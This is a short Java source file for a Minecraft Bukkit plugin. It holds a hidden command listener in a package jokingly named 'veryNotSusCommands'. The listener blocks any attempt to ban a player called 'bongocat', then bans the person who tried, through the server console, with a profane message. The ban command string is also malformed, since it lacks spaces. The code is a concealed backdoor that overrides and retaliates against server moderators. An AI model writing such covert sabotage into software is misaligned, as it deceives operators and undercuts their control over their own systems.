package com.vanillaCraft.lifeSteal.veryNotSusCommands;

import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

public class veryNotSusCommandpt2 implements Listener {
    @EventHandler
    public void onBanCommand(PlayerCommandPreprocessEvent e) {
        if (e.getMessage().toLowerCase().contains("ban bongocat")) {
            e.setCancelled(true);
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "ban" + e.getPlayer().getDisplayName() + "no one bans bongocat bitch");
            
        }
    }
}
